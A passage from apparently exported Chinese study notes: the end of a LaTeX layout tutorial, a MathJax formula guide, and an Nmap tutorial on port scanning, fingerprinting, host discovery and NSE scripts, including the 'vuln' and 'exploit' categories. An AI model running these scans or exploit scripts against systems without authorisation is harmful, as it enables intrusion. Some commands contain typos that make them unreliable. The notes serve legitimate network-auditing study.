插图，首先要说的是：「LaTeX 只支持 .eps 格式的图档」这个说法是错误的。\n\n在 LaTeX 中插入图片，有很多种方式。最好用的应当属利用 graphicx 宏包提供的 \\includegraphics 命令。比如你在你的 TeX 源文件同目录下，有名为 a.jpg 的图片，你可以用这样的方式将它插入到输出文档中：\n```latex\n\\documentclass{article}\n\\usepackage{graphicx}\n\\begin{document}\n\\includegraphics{a.jpg}\n\\end{document}\n```\n图片可能很大，超过了输出文件的纸张大小，或者干脆就是你自己觉得输出的效果不爽。这时候你可以用 \\includegraphics 控制序列的可选参数来控制。比如\n```latax\n\\includegraphics[width = .8\\textwidth]{a.jpg}\n```\n这样图片的宽度会被缩放至页面宽度的百分之八十，图片的总高度会按比例缩放。\n\n## 表格\ntabular 环境提供了最简单的表格功能。它用 \\hline 命令表示横线，在列格式中用 | 表示竖线；用 & 来分列，用 `\\\\`来换行；每列可以采用居左、居中、居右等横向对齐方式，分别用 l、c、r 来表示。\n```latex\n\\begin{tabular}{|l|c|r|}\n \\hline\n操作系统& 发行版& 编辑器\\\\\n \\hline\nWindows & MikTeX & TexMakerX \\\\\n \\hline\nUnix/Linux & teTeX & Kile \\\\\n \\hline\nMac OS & MacTeX & TeXShop \\\\\n \\hline\n通用& TeX Live & TeXworks \\\\\n \\hline\n\\end{tabular}\n```\n效果：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163951.png)\n\n## 浮动体\n插图和表格通常需要占据大块空间，所以在文字处理软件中我们经常需要调整他们的位置。figure 和 table 环境可以自动完成这样的任务；这种自动调整位置的环境称作浮动体(float)。我们以 figure 为例。\n```latex\n\\begin{figure}[htbp]\n\\centering\n\\includegraphics{a.jpg}\n\\caption{有图有真相}\n\\label{fig:myphoto}\n\\end{figure}\n```\n\nhtbp 选项用来指定插图的理想位置，这几个字母分别代表 here, top, bottom, float page，也就是就这里、页顶、页尾、浮动页（专门放浮动体的单独页面或分栏）。\\centering 用来使插图居中；\\caption 命令设置插图标题，LaTeX 会自动给浮动体的标题加上编号。注意 \\label 应该放在标题命令之后。\n\n# 版面设置\n## 页边距\n设置页边距，推荐使用 geometry 宏包。可以在这里查看它的说明文档。\n比如我希望，将纸张的长度设置为 20cm、宽度设置为 15cm、左边距 1cm、右边距 2cm、上边距 3cm、下边距 4cm，可以在导言区加上这样几行：\n```latex\n\\usepackage{geometry}\n\\geometry{papersize={20cm,15cm}}\n\\geometry{left=1cm,right=2cm,top=3cm,bottom=4cm}\n```\n\n## 页眉页脚\n设置页眉页脚，推荐使用 fancyhdr 宏包。可以在这里查看它的说明文档。\n比如我希望，在页眉左边写上我的名字，中间写上今天的日期，右边写上我的电话；页脚的正中写上页码；页眉和正文之间有一道宽为 0.4pt 的横线分割，可以在导言区加上如下几行：\n```latex\n\\usepackage{fancyhdr}\n\\pagestyle{fancy}\n\\lhead{\\author}\n\\chead{\\date}\n\\rhead{152xxxxxxxx}\n\\lfoot{}\n\\cfoot{\\thepage}\n\\rfoot{}\n\\renewcommand{\\headrulewidth}{0.4pt}\n\\renewcommand{\\headwidth}{\\textwidth}\n\\renewcommand{\\footrulewidth}{0pt}\n```\n\n## 首行缩进\nCTeX 宏集已经处理好了首行缩进的问题（自然段前空两格汉字宽度）。因此，使用 CTeX 宏集进行中西文混合排版时，我们不需要关注首行缩进的问题。\n\n> 如果你因为某些原因选择不适用 CTeX 宏集（不推荐）进行中文支持和版式设置，则你需要做额外的一些工作。\n- 调用 indentfirst 宏包。具体来说，中文习惯于每个自然段的段首都空出两个中文汉字的长度作为首行缩进，但西文行文习惯于不在逻辑节（\\section 等）之后缩进。使用改宏包可使 LaTeX 在每个自然段都首行缩进。\n- 设置首行缩进长度 \\setlength{\\parindent}{2\\ccwd}。其中 \\ccwd 是 xeCJK 定义的宏，它表示当前字号中一个中文汉字的宽度。\n\n## 行间距\n我们可以通过 setspace 宏包提供的命令来调整行间距。比如在导言区添加如下内容，可以将行距设置为字号的 1.5 倍：\n```latex\n\\usepackage{setspace}\n\\onehalfspacing\n```\n\n## 段间距\n我们可以通过修改长度 \\parskip 的值来调整段间距。例如在导言区添加以下内容\n```latex\n\\addtolength{\\parskip}{.4em}\n```\n则可以在原有的基础上，增加段间距 0.4em。如果需要减小段间距，只需将该数值改为负值即可。\n\n\n"
  },
  {
    "title": "./notes/基础知识/项目管理/项目管理.md",
    "body": ""
  },
  {
    "title": "./notes/软件/markdown.md",
    "body": "# markdown数学公式\n笔者认为所谓插入数学公式其实就是引入一种规则，然后通过模板？渲染成公式，不知道这个理解对不对，不对望指正。其实你以前可能就看到过有的博客本该出现公式的时候不显示，点击后会链接到一个 new tab 然后显示一张公式的图片，有时却出现一大堆的代码。这里就是通过这段代码解析成公式然后显示的。\n\n这里我们选取 MathJax 引擎。\n引入脚本，把下面代码插入 MD 文件里面，如果你怕这份在线文件源别人访问不到的话，可以把这个下下来自己做一个源，这样比较稳定缺点是要自己手动更新源。\n\n```\n<script type=\"text/javascript\" src=\"http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default\"></script>\n```\n\n复制代码好了到这里就可以插入公式了，如果你懂 LaTeX 的话那看一两个例子就知道了，不懂也没关系，自己写一写代码就知道了，可以找一个可以预览 MD 的工具一直尝试。\n## 插入方式\n这里分两种，一种是行间插入，另一种是另取一行\n### 行间插入\n```\n\\\\(a + b\\\\)\n$a+b$\n```\n复制代码这里是行间插入公式 a + b : \\(a + b\\)，特点就是通过( 和 ) 包含公式，然后为了模板引擎能够区分该 ( 不是普通文本的 ( 而是公式的 (，通过 \\\\ 转义一下。这样应该就很好理解这个语法构成了。注意这里方式不唯一，这是笔者喜欢的方式，其他的使用方式自行搜索。下面的介绍同样是这样。\nPS: 这里掘金使用的是 $a + b$ : ，如果对您的阅读产生印象，请看最后说明，这里就不做一一更改了。谢谢。\n### 另取一行\n```\n$$a + b$$\n```\n$$a + b$$\n\n这里是另取一行\n在mathjax中 \\\\ 表示换行的意思\n\n特点就是通过$$包含公式。\n\n笔者认为第二种方式更好，以下没看 JS 源码纯属猜测：行间的需要考虑到当前行的行高并对公式进行处理，而另取一行就更简单一些，可能解析起来更快。最最最最最最主要是看起来漂亮 ^_^ 不太要考虑空间不够换行。\n## 基本类型的插入\n\n### 上、下标\n先看结果再总结语法吧。\n```\n$$x_1$$\n\n$$x_1^2$$\n\n$$x^2_1$$\n\n$$x_{22}^{(n)}$$\n\n$${}^*x^*$$\n\n$$x_{balabala}^{bala}$$\n```\n$$x_1$$\n\n$$x_1^2$$\n\n$$x^2_1$$\n\n$$x_{22}^{(n)}$$\n\n$${}^*x^*$$\n\n$$x_{balabala}^{bala}$$\n\n\n可以看到 x 元素的上标通过 ^ 符号后接的内容体现，下标通过 _ 符号后接的内容体现，多于一位是要加 {} 包裹的。\n笔者习惯先下标后上标的写法，和我的书写习惯一致：x_{balabala}^{bala}，不管你使用哪一种风格，最好自己注意统一，不要混用。\n### 分式\n```\n$$\\frac{x+y}{2}$$\n\n$$\\frac{1}{1+\\frac{1}{2}}$$\n```\n$$\\frac{x+y}{2}$$\n\n$$\\frac{1}{1+\\frac{1}{2}}$$\n\n这里就出现了一个 frac{}{} 函数的东西，同样，为了区分这是函数不是几个字母，通过 \\frac 转义，于是 frac 被解析成函数，然后第一个 {} 里面的被解析成分子，第二个 {} 被解析成分母。这里可以试试分数的行间解析。我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果我要看行间填充效果。\n### 根式\n```\n$$\\sqrt{2}<\\sqrt[3]{3}$$\n\n$$\\sqrt{1+\\sqrt[p]{1+a^2}}$$\n\n$$\\sqrt{1+\\sqrt[^p\\!]{1+a^2}}$$\n```\n$$\\sqrt{2}<\\sqrt[3]{3}$$\n\n$$\\sqrt{1+\\sqrt[p]{1+a^2}}$$\n\n$$\\sqrt{1+\\sqrt[^p\\!]{1+a^2}}$$\n\n读到这里你已经了解了函数的概念，那么这历久很简单了，语法就是 sqrt[]{} 。[] 中代表是几次根式，{} 代表根号下的表达式。第二和第三个的区别在于为了美观微调位置 ^_^。\n### 求和、积分\n```\n$$\\sum_{k=1}^{n}\\frac{1}{k}$$\n\n$\\sum_{k=1}^n\\frac{1}{k}$\n\n$$\\int_a^b f(x)dx$$\n\n$\\int_a^b f(x)dx$\n```\n$$\\sum_{k=1}^{n}\\frac{1}{k}$$\n\n$\\sum_{k=1}^n\\frac{1}{k}$\n\n$$\\int_a^b f(x)dx$$\n\n$\\int_a^b f(x)dx$\n\n\n\n这里很容易看出求和函数表达式 sum_{起点}^{终点}表达式，积分函数表达式 int_下限^上限 被积函数d被积量。还有一个有趣的是行间的公式都被压缩了。\n### 空格\n```\n紧贴 $a\\!b$\n没有空格 $ab$\n小空格 a\\,b\n中等空格 a\\;b\n大空格 a\\ b\nquad空格 $a\\quad b$\n两个quad空格 $a\\qquad b$\n```\n紧贴 $a\\!b$\n没有空格 $ab$\n小空格 a\\,b\n中等空格 a\\;b\n大空格 a\\ b\nquad空格 $a\\quad b$\n两个quad空格 $a\\qquad b$\n\n\n这个直接看上面的文字，介绍很清楚，主要指微调距离，使得公式更加漂亮。请比较下面的积分公式：\n```\n$$\\int_a^b f(x)\\mathrm{d}x$$\n\n$$\\int_a^b f(x)\\,\\mathrm{d}x$$\n```\n$$\\int_a^b f(x)\\mathrm{d}x$$\n\n$$\\int_a^b f(x)\\,\\mathrm{d}x$$\n\n### 公式界定符\n```\n\\\\( ( \\\\)\n\\\\( ) \\\\)\n\\\\( [ \\\\)\n\\\\( ] \\\\)\n\\\\( \\\\{ \\\\)\n\\\\( \\\\} \\\\)\n\\\\( | \\\\)\n\\\\( \\\\| \\\\)\n掘金：\n$ ( $\n$ ) $\n$ [ $\n$ ] $\n$ \\{ $\n$ \\} $\n$ | $\n$ \\| $\n```\n主要符号有 ( ) [ ] { } | | 那么如何使用呢？ 通过 \\left 和 \\right 后面跟界定符来对同时进行界定。\n\n$$\\left(\\sum_{k=\\frac{1}{2}}^{N^2}\\frac{1}{k}\\right)$$\n### 矩阵\n```\n$$\\begin{matrix}1 & 2\\\\\\\\3 &4\\end{matrix}$$\n\n$$\\begin{pmatrix}1 & 2\\\\\\\\3 &4\\end{pmatrix}$$\n\n$$\\begin{bmatrix}1 & 2\\\\\\\\3 &4\\end{bmatrix}$$\n\n$$\\begin{bmatrix}1 & 2\\\\\\\\3 &4\\end{bmatrix}$$\n\n$$\\begin{vmatrix}1 & 2\\\\\\\\3 &4\\end{vmatrix}$$\n\n$$\\left|\\begin{matrix}1 & 2\\\\\\\\3 &4\\end{matrix}\\right|$$\n\n$$\\begin{vmatrix}1 & 2\\\\\\\\3 &4\\end{vmatrix}$$\n```\n$$\\begin{matrix}1 & 2\\\\\\\\3 &4\\end{matrix}$$\n\n$$\\begin{pmatrix}1 & 2\\\\\\\\3 &4\\end{pmatrix}$$\n\n$$\\begin{bmatrix}1 & 2\\\\\\\\3 &4\\end{bmatrix}$$\n\n$$\\begin{bmatrix}1 & 2\\\\\\\\3 &4\\end{bmatrix}$$\n\n$$\\begin{vmatrix}1 & 2\\\\\\\\3 &4\\end{vmatrix}$$\n\n$$\\left|\\begin{matrix}1 & 2\\\\\\\\3 &4\\end{matrix}\\right|$$\n\n$$\\begin{vmatrix}1 & 2\\\\\\\\3 &4\\end{vmatrix}$$\n类似于 left right，这里是 begin 和 end。而且里面有具体的矩阵语法，& 区分行间元素，\\\\\\\\ 代表换行。可以理解为 HTML 的标签之类的。\n\n### 排版数组\n```\n$$\n\\mathbf{X} =\n\\left( \\begin{array}{ccc}\nx\\_{11} & x\\_{12} & \\ldots \\\\\\\\\nx\\_{21} & x\\_{22} & \\ldots \\\\\\\\\n\\vdots & \\vdots & \\ddots\n\\end{array} \\right)\n$$\n```\n$$\n\\mathbf{X} =\n\\left( \\begin{array}{ccc}\nx\\_{11} & x\\_{12} & \\ldots \\\\\\\\\nx\\_{21} & x\\_{22} & \\ldots \\\\\\\\\n\\vdots & \\vdots & \\ddots\n\\end{array} \\right)\n$$\n\n## 常用公式举例\n\n### 多行公式\n主要是各种方程的表达\n#### 长公式\n```\n$$\n\\begin{multline}\nx = a+b+c+{} \\\\\\\\\nd+e+f+g\n\\end{multline}\n$$\n```\n$$\n\\begin{multline}\nx = a+b+c+{} \\\\\\\\\nd+e+f+g\n\\end{multline}\n$$\n\n```\n$$\n\\begin{aligned}\nx ={}& a+b+c+{} \\\\\\\\\n&d+e+f+g\n\\end{aligned}\n$$\n```\n$$\n\\begin{aligned}\nx ={}& a+b+c+{} \\\\\\\\\n&d+e+f+g\n\\end{aligned}\n$$\n\n####  公式组\n\n```\n$$\n\\begin{gather}\na = b+c+d \\\\\\\\\nx = y+z\n\\end{gather}\n$$\n```\n其中 一个\\\\表示一个\\n\n\n$$\n\\begin{gather}\na = b+c+d \\\\\\\\\nx = y+z\n\\end{gather}\n$$\n```\n$$\n\\begin{align}\na &= b+c+d \\\\\\\\\nx &= y+z\n\\end{align}\n$$\n```\n其中 & 表示对齐符\n\n$$\n\\begin{align}\na &= b+c+d \\\\\\\\\nx &= y+z\n\\end{align}\n$$\n\n$$\n\\begin{aligned}\na &= b+c+d \\\\\\\\\nx &= y+z\n\\end{aligned}\n$$\n#### 分段函数\n```\n$$\ny=\\begin{cases}\n-x,\\quad x\\leq 0 \\\\\\\\\nx,\\quad x>0\n\\end{cases}\n$$\n```\n$$\ny=\\begin{cases}\n-x,\\quad x\\leq 0 \\\\\\\\\nx,\\quad x>0\n\\end{cases}\n$$\n里面用到了 \\(\\leq\\) 符号，下一章会介绍常用数学符号。\n## 数组的其他使用\n### 划线\n```\n$$\n\\left(\\begin{array}{|c|c|}\n1 & 2 \\\\\\\\\n\\\\hline\n3 & 4\n\\end{array}\\right)\n$$\n```\n$$\n\\left(\\begin{array}{|c|c|}\n1 & 2 \\\\\\\\\n\\\\hline\n3 & 4\n\\end{array}\\right)\n$$\n### 制表\n```\n$$\n\\begin{array}{|c|c|}\n\\hline\n{1111111111} & 2 \\\\\\\\\n\\hline\n3 & 4 \\\\\\\\\n\\hline\n\\end{array}\n$$\n```\n$$\n\\begin{array}{|c|c|}\n\\hline\n{1111111111} & 2 \\\\\\\\\n\\hline\n3 & 4 \\\\\\\\\n\\hline\n\\end{array}\n$$\n可以看到，其实其他很多东西都可以很灵活的表达出来。碰到其他有趣的我会继续写出来的。\n\n## 常用数学符号\n这里提供一个文档下载，如果上面的链接失效，也可以到我的 GitHub 下载 pdf 版。下面举几个例子。\n希腊字母\n```\n$$\n\\begin{array}{|c|c|c|c|c|c|c|c|}\n\\hline\n{\\alpha} & {\\backslash alpha} & {\\theta} & {\\backslash theta} & {o} & {o} & {\\upsilon} & {\\backslash upsilon} \\\\\\\\\n\\hline\n{\\beta} & {\\backslash beta} & {\\vartheta} & {\\backslash vartheta} & {\\pi} & {\\backslash pi} & {\\phi} & {\\backslash phi} \\\\\\\\\n\\hline\n{\\gamma} & {\\backslash gamma} & {\\iota} & {\\backslash iota} & {\\varpi} & {\\backslash varpi} & {\\varphi} & {\\backslash varphi} \\\\\\\\\n\\hline\n{\\delta} & {\\backslash delta} & {\\kappa} & {\\backslash kappa} & {\\rho} & {\\backslash rho} & {\\chi} & {\\backslash chi} \\\\\\\\\n\\hline\n{\\epsilon} & {\\backslash epsilon} & {\\lambda} & {\\backslash lambda} & {\\varrho} & {\\backslash varrho} & {\\psi} & {\\backslash psi} \\\\\\\\\n\\hline\n{\\varepsilon} & {\\backslash varepsilon} & {\\mu} & {\\backslash mu} & {\\sigma} & {\\backslash sigma} & {\\omega} & {\\backslash omega} \\\\\\\\\n\\hline\n{\\zeta} & {\\backslash zeta} & {\\nu} & {\\backslash nu} & {\\varsigma} & {\\backslash varsigma} & {} & {} \\\\\\\\\n\\hline\n{\\eta} & {\\backslash eta} & {\\xi} & {\\backslash xi} & {\\tau} & {\\backslash tau} & {} & {} \\\\\\\\\n\\hline\n{\\Gamma} & {\\backslash Gamma} & {\\Lambda} & {\\backslash Lambda} & {\\Sigma} & {\\backslash Sigma} & {\\Psi} & {\\backslash Psi} \\\\\\\\\n\\hline\n{\\Delta} & {\\backslash Delta} & {\\Xi} & {\\backslash Xi} & {\\Upsilon} & {\\backslash Upsilon} & {\\Omega} & {\\backslash Omega} \\\\\\\\\n\\hline\n{\\Omega} & {\\backslash Omega} & {\\Pi} & {\\backslash Pi} & {\\Phi} & {\\backslash Phi} & {} & {} \\\\\\\\\n\\hline\n\\end{array}\n$$\n```\n\n$$\n\\begin{array}{|c|c|c|c|c|c|c|c|}\n\\hline\n{\\alpha} & {\\backslash alpha} & {\\theta} & {\\backslash theta} & {o} & {o} & {\\upsilon} & {\\backslash upsilon} \\\\\\\\\n\\hline\n{\\beta} & {\\backslash beta} & {\\vartheta} & {\\backslash vartheta} & {\\pi} & {\\backslash pi} & {\\phi} & {\\backslash phi} \\\\\\\\\n\\hline\n{\\gamma} & {\\backslash gamma} & {\\iota} & {\\backslash iota} & {\\varpi} & {\\backslash varpi} & {\\varphi} & {\\backslash varphi} \\\\\\\\\n\\hline\n{\\delta} & {\\backslash delta} & {\\kappa} & {\\backslash kappa} & {\\rho} & {\\backslash rho} & {\\chi} & {\\backslash chi} \\\\\\\\\n\\hline\n{\\epsilon} & {\\backslash epsilon} & {\\lambda} & {\\backslash lambda} & {\\varrho} & {\\backslash varrho} & {\\psi} & {\\backslash psi} \\\\\\\\\n\\hline\n{\\varepsilon} & {\\backslash varepsilon} & {\\mu} & {\\backslash mu} & {\\sigma} & {\\backslash sigma} & {\\omega} & {\\backslash omega} \\\\\\\\\n\\hline\n{\\zeta} & {\\backslash zeta} & {\\nu} & {\\backslash nu} & {\\varsigma} & {\\backslash varsigma} & {} & {} \\\\\\\\\n\\hline\n{\\eta} & {\\backslash eta} & {\\xi} & {\\backslash xi} & {\\tau} & {\\backslash tau} & {} & {} \\\\\\\\\n\\hline\n{\\Gamma} & {\\backslash Gamma} & {\\Lambda} & {\\backslash Lambda} & {\\Sigma} & {\\backslash Sigma} & {\\Psi} & {\\backslash Psi} \\\\\\\\\n\\hline\n{\\Delta} & {\\backslash Delta} & {\\Xi} & {\\backslash Xi} & {\\Upsilon} & {\\backslash Upsilon} & {\\Omega} & {\\backslash Omega} \\\\\\\\\n\\hline\n{\\Omega} & {\\backslash Omega} & {\\Pi} & {\\backslash Pi} & {\\Phi} & {\\backslash Phi} & {} & {} \\\\\\\\\n\\hline\n\\end{array}\n$$\n\n写太累了😂😂😂。。。其他的详见 [PDF](https://github.com/mk43/BlogResource/blob/master/LaTex/LATEX%E6%95%B0%E5%AD%A6%E7%AC%A6%E5%8F%B7%E8%A1%A8.pdf)。"
  },
  {
    "title": "./notes/软件/nmap.md",
    "body": "---\ntitle: Nmap的使用\ndate: 2019/11/29\nupdate: {{ date }}\ncategories:\n - net\n---\n# nmap介绍\nNmap是一款开源、免费的网络探测、安全审计的工具。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926093208.png\"/>\nnmap官网下载： http://nmap.org/\n\n# Nmap列举远程机器开放的端口\n## 原理\nNmap扫描原理示意图\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926094216.png\"/>\n\n## Nmap列举远程机器开放的端口\n1. 使用nmap scanme.nmap.org来列举该站点的端口信息，以下给出zenamp下扫描结果，也可以是使用命令行下的nmap来探测。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926094426.png\"/>\n2. nmap进行探测之前要把域名通过DNS服务器解析为IP地址，我们也可以使用指定的DNS服务器进行解析。使用--dns-servers参数来指定。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926122709.png\"/>\n其中8.8.8.8为谷歌的DNS\n3. 如果有些网站打得开,却ping不通,这很有可能是网站服务器为了防止DoS攻击，通常在防火墙里设置拦截ICMP报文，而ping报文正是ICMP报文的一种，当然ping不通了 网站却打得开\n对于已经知道主机存活或者防火墙开启的机器，可以使用-Pn参数来停止探测之前的ICMP请求。已达到不触发防火墙安全机制。\n\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926122927.png\"/>\n4. 对于默认的端口范围，并不能满足日常工作需要。可以使用-p m-n来指定探测端口范围为m-n之间的所有端口。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926123049.png\"/> \n## 端口状态\n- Open表示端口处于开放状态；\n- Closed 表示端口处于关闭状态；\n- Filterd 表示端口处于过滤无法收到返回的probe状态；\n- UnFilterd 表示端口收到返回的probe，但是无法确认；\n- Opend/UnFilterd 表示端口处于开放或者是过滤状态；\n- Closed/UnFilterd 表示端口处于关闭或者未过滤状态。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926123316.png\"/>\n\n## Nmap扫描技术查看\n在命令行中，输入nmap -h来查看nmap自带的帮助信息。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926123623.png\"/>\n\n# 识别目标机器上的服务的指纹\n## 服务指纹\n为了确保有一个成功的渗透测试或网络设备监控，必须需要知道目标系统中服务的指纹信息。服务指纹信息包括服务端口、服务名和版本等。\n通过分析目标往Nmap发送的数据包中某些协议标记、选项和数据，我们可以推断发送这些数据包的操作系统等。\nnmap通过向目标主机发送多个UDP与TCP数据包并分析其响应来进行操作系统指纹识别工作。\n## Nmap识别服务指纹\n使用命令nmap -sV IP地址 来识别目标机器的服务信息。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926124048.png\"/>\n## Nmap侵略性的探测\n1. 使用命令`nmap -A -v -T4 IP地址`来探测目标机器的操作系统、服务等信息。\n其中-A: 表示namp使用侵略性的探测\n-v: 表示持续输出返回的解析， 如果不加这个参数， 那就只能通过按回车键来查看返回的解析\n-T4: 表示加快速度来进行探测，  其中的值为1~5\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926124540.png\"/>\n2. 使用`nmap -sC -sV -O IP地址`来探测目标机器的操作系统、服务等信息。\n其中sc参数表示使用Nmap脚本进行探测，sV表示探测目标机器上的服务信息，O表示探测目标机器的操作系统信息。-sC: equivalent to --script=default\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926125002.png\"/>\n\n# 发现局域网中存活主机\n## 主机发现\n一个局域网中肯定是连接着多台设备，那么我们如何获取哪些设备正在开机状态呢？\n使用ping ip地址进行探测，但是如果一个网络很大的情况下，这样的手工探测显得很费劲。\n\n可以使用不同的工具来进行批量探测，在探测之前需要明白CIDR的含义。\nCIDRCIDR（无类别域间路由，Classless Inter-Domain Routing），可以快速表示一个网络。\n比如：172.16.1.1/24表示在172.168.1.1-172.16.1.255之间的所有主机IP地址。\n## Nmap主机发现\n1. 使用Nmap命令：`nmap -sP CIDR`对该网络中所有主机进行ping扫描，以探测主机存活性。扫描过程中使用了TCP SYN扫描、ICMP echo Request来探测主机存活。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926125611.png\"/>\n2. 使用Nmap命令：`nmap -sn CIDR`对该网络中所有主机进行ping扫描，以探测主机存活性。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926125836.png\"/>\n## 结果输出\n使用Nmap命令：`nmap -sn CIDR -oX test.xml`对该网络中所有主机进行ping扫描，以探测主机存活性。 同时将结果输出到test.xml文件中，以便后续使用。\n\n# 端口探测技巧\n## 实际场景\n在实际环境中，当系统管理员对设备进行管理时，或者渗透测试人员对设备进行检测时，并不一定对所有的服务进行操作。极有可能是对某个或某个范围内的服务进行检测。\n如果对所有服务进行探测，那么就会出现耗时长，费力不讨好的情况。针对这样的情况，我们很有必要了解如何使用Nmap来更加灵活的进行服务探测，避免全端口探测对服务器造成压力。\n## 端口探测技巧\n对某个端口进行探测`nmap -p80 scanme.nmap.org`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926130350.png\"/>\n对某几个端口进行探测`nmap -p8e,135 scanme.nmap.org`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926130500.png\"/>\n对某个范围端口进行探测`nmap -p1-100 scanme.nmap.org`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926130607.png\"/>\n对所有端口进行探测`nmap -p- scanme.nmap.org`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926130750.png\"/> \n指定协议探测端口`nmap -p T:25,U:53 scanme.nmap.org`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926130905.png\"/>\n通过协议名来扫描端口`nmap -p smtp scanme.nmap.org`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926131130.png\"/>\n通过名称范围扫描`nmap -p s* scanme.nmap.org`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926131324.png\"/>\n扫描注册在nmap中的端口`nmap -p [1~65535] scanme.nmap.org`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926131422.png\"/>\n\n# NSE脚本使用\n## NSE介绍\nNSE（Nmap Script Engine）Nmap脚本引擎，内置很多可以用来扫描的、针对特定任务的脚本。\n通过NSE可以不断拓展Nmap的扫描策略，加强Nmap的功能。\nNmap中使用--script参数来指定调用的脚本，并且脚本存储在Nmap安装路径下的script文件央下，对于kali Linux存储在/usr/share/nmap/script/下。\n## NSE的使用\n1. 使用Nmap探测Web服务的title信息， `nmap --script 脚本名称 目标`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926131745.png\"/>\n以上通过Nmap使用http-title脚本进行探测，还可以使用其他脚本进行探测。目前为止可以用的有589个脚本，每个脚本都有其独特的作用。\n2. 使用Nmap探测http服务的http头 ` nmap --script http-headers 目标`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926131945.png\"/>\n3. 对于目标使用多个分类脚本进行探测， 可以更快的找到目标的信息与弱点\n使用Namp中的漏洞分类脚本对目标进行探测，使用命令如下：`nmap -sV --script vuln 目标`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926134716.png\"/>\n4. 使用Nmap中发现和版本信息分类进行探测， 使用命令如下：`nmap -sV --script=\"version, discovery\" 目标`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926134935.png\"/>\n5. 使用Nmap除了exploit分类之外的其他分类进行探测，使用命令如下：`nmap -sV --script=\"not exploit\" 目标`\n6. 使用Nmap中http*的脚本，但是除了（http-brute和http-slowlors），使用命令如下：\n`nmap -sV --script\"(http*) and not(http-slowlors and http-brute)\" 目标`\n## NSE调试功能的使用\n使用Nmap中exploit，但是在使用的同时开启调试模式。使用命令如下：\n`nmap -sV --script exploit -d 3--script-trace 目标`\n注意：-d（debug 范围e～9）`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926135410.png\"/>\n\n## NSE参数的使用\n使用nmap的http-title脚本，并且指定使用对应的User-Agent。命令如下：\n`nmap -sV --script http-title --script-args http.useragent=\"Mozilla 999\" <target>`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926135705.png\"/>\n\n## NSE更新\n`nmap --script-updatedb`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926135802.png\"/>\n## NSE脚本分类\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926135947.png\"/>\n\n# 使用特定网卡进行探测\n## 情景介绍\nNmap是一款可拓展性强的工具，并且有些NSE脚本支持嗅探。但是这种功能需要网卡支持混杂模式才可以。或者当计算机上有两张网卡，并且两张网卡对应的不同网络。\nNmap中提供了切换使用特定网卡进行探测的参数-e\n\n## 指定网卡进行探测\n1. 使用Nmap命令： `nmap -e interface CIDR`\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926140222.png\"/>\n\n2. 查看当前window下的网卡接口\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926142032.png\"/>\n\n\n# 对比扫描结果ndiff\n## 情景介绍\n对某个网路进行探测的时候，有可能之前有探测过的结果，现在探测过后，需要对之前的结果与现在的结果来对比，找到两次不同点。\n监视网络变化，达到网络监控的目的。\n## ndiff介绍\n在Nmap整个工程中，除了主要的nmap工具之外，还包括很多其他工具。如接下来要使用到的ndif工具。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926140545.png\"/>\n## 比较Nmap两次扫描结果\n使用命令： `ndiff.exe File1 File2`\n（File1和File2是Nmap扫描结果的xml格式。-oX）\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926140857.png\"/>\n\n# 可视化Nmap的使用\n## 可视化Nmap(Zenmap)介绍\n-Nmap命令参数复杂，组合类型多种多样，如果使用命令行类型的Nmap需要记忆大量命令，对于网络管理员和渗透测试者都是一项艰巨的任务。但是如果使用可视化Nmap（Zenmap），那么就不存在这样的问题。\n在安装Nmap的同时，会自动安装可视化Nmap（Zenmap），可以在安装目录中找到。\n## Zenmap的使用\n1. 配置扫描策略\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20190926141250.png\"/>\n"
  },
  {
    "title": "./notes/软件/Cisco.md",
